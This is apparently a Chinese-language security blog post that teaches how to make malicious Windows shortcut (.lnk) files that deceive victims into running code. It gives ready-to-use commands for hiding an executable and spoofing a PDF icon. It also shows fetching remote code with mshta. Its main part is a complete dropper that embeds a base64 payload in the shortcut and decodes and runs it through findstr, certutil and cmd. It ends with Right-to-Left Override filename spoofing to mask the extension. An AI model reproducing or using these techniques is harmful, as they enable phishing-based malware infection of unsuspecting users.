---
layout: post
title: 'windows lnk'
subtitle: 'windows快捷方式利用'
tags: 安全 Windows 渗透
---

目标: 将 `windows快捷方式`伪装成合法的文件，欺骗受害者打开。

恶意的快捷方式，一般利用方式有如下三种：

- 通过伪装的lnk文件，执行当前目录下某个恶意文件（一般会设为隐藏文件）
- 通过伪装的lnk文件，加载并执行远程的恶意代码
- 仅存放一个link文件，执行自身的恶意代码

# 0x01 执行恶意文件

将快捷方式伪装成 `pdf`或`word`指向隐藏的恶意程序，配合其他迷惑性文件打包在一起，发送给受害者，欺骗其打开。

这里便需要做到：

- 隐藏恶意程序
- `lnk`文件可执行相对路径下的文件
- 快捷方式的图标需要为系统默认的`pdf`图标或`word`图标，以迷惑受害者

## 隐藏恶意程序

这里我们主要谈文件属性上的隐藏。对于windows中的隐藏文件，可认为分为两个级别。

第一个级别为普通的隐藏文件，只需要在文件属性中勾选 "隐藏"即可实现。想要展示出来也是非常简单，只需要勾选上“隐藏的项目”即可显示，这里不再过多赘述。

第二个级别为“受保护的操作系统文件”。这个选项为微软为了保护一些关键性的系统文件而设置的，对于这种属性的文件，仅在”隐藏的项目“上勾选是不会显示的。需要在文件夹选项中，去掉“隐藏受保护的操作系统文件”后才会展示出来。如下图所示：

![image-20210904192611588](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210904192611588.png)

我们可以借助`attrib`为指定文件添加 `+S`系统文件属性、`+H`隐藏文件属性，即可实现

```
attrib +S +H evil.exe
```

## `lnk`执行相对路径下的文件

对于正常的快捷方式来说，执行目标只能指定绝对路径下的文件，这对我们的利用造成了很大的困扰。因为我们无法控制恶意文件所在的绝对路径。不过我们可以借助其他程序来执行我们的恶意程序。

例如 `C:\Windows\System32\rundll32.exe url.dll,FileProtocolHandler xxx.exe`

又或者: `C:\Windows\System32\cmd.exe /c start xxx.exe`

不过需要注意，当我们使用`cmd`时，或是待执行的恶意文件为`bat`等文件时，会闪出一个黑窗口，这时可设置其运行方式为"最小化"，以避免此问题。

![image-20210904200019144](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210904200019144.png)

## 设置快捷方式图标

至此，基本功能上已经完成了，但还需要将其图标进行伪装。以pdf文件为例，在windows系统中，`pdf`文件展示的图标一般是第三方应用的图标，有些默认用`chrome`打开pdf文件，那`pdf`文件的图标在他的电脑上就是`chrome`的图标，有些默认用 `Adobe Reader`，则`pdf`文件的图标在他的电脑上是 `Adobe Reader`图标。

那我们怎样将自己伪装成`pdf`的快捷方式设置为对应默认应用的图标呢？

翻一下`LNK`文件的结构，我们可以找到一个字段: `ICON_LOCATION`，当设置了 `HasIconLocation`标识后，可通过 `ICON_LOCATION`来指定这个快捷方式使用图标。对应了快捷方式属性设置中的”更改图标”操作，如下图所示。

![image-20210904201639920](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210904201639920.png)

不过这个功能在windows的正常操作中，只能指定为有图标的程序，无法随意设置，更无法做到自动联想到指定的默认图标。在观察了一些相关病毒后，发现了解决方案：

我这里拿`010Editor`对其进行更改，将 `ICON_LOCATION`字段设置为 `.\xx.pdf`，当然 `xx`可随意设置，不存在的文件也可。

![image-20210904202511768](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210904202511768.png)

再回过头来看这个快捷方式，可看到图标已成功修改

![image-20210904202603258](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210904202603258.png)

至此，可执行恶意文件的快捷方式制作完成。不过此方式仍存在一定的局限性，例如需要发送一个压缩包给到受害者，而正常用户只会给到单个pdf文件，这容易引起受害者的警觉等。

# 0x02 执行远程恶意代码

相对于“执行恶意文件”，该方式仅需一个`lnk`文件即可完成攻击。

相当于远程执行命令，可通过`mshta`、`powershell`、`msiexec`、`bitsadmin`等方式加载远程指令

以mshta为例，快捷方式指向的目标设置为: `C:\Windows\System32\mshta.exe http://xx.xxx/x`

当然，以这种形式很很容被检测到，且直接执行这种敏感命令也很难做到免杀。

# 0x03 执行自身的恶意代码

相对于上面的需要从远程加载恶意代码，此方式会将恶意代码藏在`lnk`文件本身中，运行时解密释放对应的恶意代码，实现利用

示例：

- 将base64编码后的恶意代码追加至 lnk 文件中
- 用`findstr`提取对应的恶意编码
- `certutil -decode`对恶意编码进行解码，输出至文件中
- `本地执行此文件`

这里以嵌入执行`calc.exe`为例

## 将恶意代码追加至`lnk`文件中

需要注意，在实际的处理中，这一步需要在`lnk`文件设置完后执行。否则更改了`lnk`的目标后，原本追加的内容会被清空。

```shell
printf '\x0d\x0a' >> evil3.pdf.lnk     # 回车换行
base64 -w 0 calc.exe >> evil3.pdf.lnk  # base64编码后追加进lnk文件
printf '\x0d\x0a' >> evil3.pdf.lnk     # 回车换行
```

## findstr提取对应的恶意编码

可以观察到，base64编码后的前缀是 `TVqQAAMAAAAEAAA`，我们可通过`findstr`对自身进行查找，提取对应的恶意编码，输出至临时文件中。

```shell
copy evil3.pdf.lnk %temp%\e3   # 这里需要注意，findstr直接查找 lnk 文件时，会去查找对应的目标文件，所以需要复制自身为一个普通的二进制文件后再进行查找
findstr "TVqQAAMAAAAEAAA" %temp%\e3 > %temp%\ee3
```

## certutil 解码提取源文件

```shell
certutil -decode %temp%\ee3 %temp%\e.exe
```

## 具体实现

创建快捷方式，设置其目标为

```
C:\Windows\System32\cmd.exe /c copy /y evil3.pdf.lnk %temp%\e3 & findstr "TVqQAAMAAAAEAAA" %temp%\e3 > %temp%\ee3 & certutil -decode %temp%\ee3 %temp%\e.exe & %temp%\e.exe
```

在其后追加回车换行及`calc.exe`对应的base64编码，即可完成

![image-20211108223706509](/assets/img/md/2021-09-13-windows-lnk.assets/image-20211108223706509.png)

## 过长参数处理

在正常操作中，快捷方式指定的参数存在长度限制，当我们想要设置复杂的命令时，会被截断，无法有效设置

这时可直接编辑该文件设置其参数，下面以`010Editor`为例：

设置参数为 `C:\Windows\System32\cmd.exe /c copy /y evil3f.pdf.lnk %temp%\e3 & copy /y C:\Windows\System32\findstr.exe %temp%\fs.exe & copy /y C:\Windows\System32\certutil.exe %temp%\cu.exe & %temp%\fs.exe "TVqQAAMAAAAEAAA" %temp%\e3 > %temp%\ee3 & %temp%\cu.exe -decode %temp%\ee3 %temp%\e.exe & %temp%\e.exe`

如下图，可看到此处为参数相关的设置（注意此处为宽字节）

![image-20210905122554541](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210905122554541.png)

我们这里将长度更改为 `300`，与其对应的，在 `0x219`处添加 `(300 - 143) * 2 = 314`个字节。

![image-20210905122819516](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210905122819516.png)

将 `/c copy /y evil3f.pdf.lnk %temp%\e3 & copy /y C:\Windows\System32\findstr.exe %temp%\fs.exe & copy /y C:\Windows\System32\certutil.exe %temp%\cu.exe & %temp%\fs.exe "TVqQAAMAAAAEAAA" %temp%\e3 > %temp%\ee3 & %temp%\cu.exe -decode %temp%\ee3 %temp%\e.exe & %temp%\e.exe直接写入即可

![image-20210905123021401](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210905123021401.png)

# 0x04 隐藏自身

通过上面的一系列操作，我们已经可以做到仅凭单个快捷方式实现攻击，但仍存在一些问题。例如，当我们将快捷方式通过邮件发送时，可看到其后缀为 `lnk`，很容易引起怀疑。

![image-20211108223848163](/assets/img/md/2021-09-13-windows-lnk.assets/image-20211108223848163.png)

这时我们可以选择在文件名中插入`unicode`字符，来实现一个视觉上的隐藏效果

## Start Of Right To Left Override

我们这里借助`RLO`字符，使部分字符从右向左读

例如我们可以让最终的文件名形如: `Microknl.简历.pdf`

可设置真实的文件名为: `Micro<RLO>fdp.历简`

如下：

浏览文件时：

![image-20210905113219900](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210905113219900.png)

作为邮件附件：

![image-20210905113322320](/assets/img/md/2021-09-13-windows-lnk.assets/image-20210905113322320.png)

# 0x05 过杀软

# 参考

> [MS-SHLLink](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/747629b3-b5be-452a-8101-b9a2ec49978c)
>
> [警惕！利用LNK快捷方式伪装nCov-19疫情的恶意攻击](https://www.freebuf.com/articles/network/233485.html)